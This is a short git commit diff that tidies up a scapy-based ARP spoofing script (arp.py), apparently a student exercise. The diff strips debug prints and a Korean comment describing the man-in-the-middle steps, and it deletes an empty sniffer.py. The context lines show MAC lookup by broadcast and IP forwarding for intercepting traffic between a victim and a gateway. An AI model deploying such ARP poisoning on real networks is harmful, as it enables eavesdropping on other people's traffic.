e23776337bccdd08e9b10f395ddfae9ad6541ba2
spjellO <wndnjs4698@naver.com>
2024-06-01 19:59:04 +0900

    final

--- arp.py
+++ arp.py
@@ -1,11 +1,3 @@
-'''
-1. 브로드캐스트를 통한 공격 대상과 Gateway의 MAC 주소 추출
-
-2. 알아낸 정보를 이용하여 공격 대상과 게이트웨이에게 공격자가 송수신자인 것처럼 ARP 프레임을 전송
-
-3. 원래는 공격 대상과 게이트웨이에게 갈 패킷들이 공격자에게 전송되기 때문에 이를 다시 원래 목적지로 포워딩
-'''
-
 from scapy.all import *
 from scapy.layers.l2 import Ether, ARP
 import sys
@@ -13,8 +5,6 @@ import os
 
 def getMAC(ip):
     ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=5, retry=3, verbose=False)
-
-    print("ans:", ans)
     if ans:
         return ans[0][1].src
 
@@ -38,13 +28,6 @@ def main(gatewayIP, victimIP):
     enable_ip_forwarding()
     victimMAC = getMAC(victimIP)
     gatewayMAC = getMAC(gatewayIP)
-
-    print("victimMAC:",victimMAC)
-    print("victimIP:", victimIP)
-
-    print("gatewayMAC:", gatewayMAC)
-    print("gatewayIP:", gatewayIP)
-    print("=============================")
 
     if victimMAC == None or gatewayMAC == None:
         print("Cannot find MAC address")
--- sniffer.py
+++
@@ -1,9 +0,0 @@
-from scapy.all import *
-from scapy.layers.l2 import Ether, ARP
-import sys
-
-def main():
-		pass
-
-if __name__ == '__main__':
-    main()
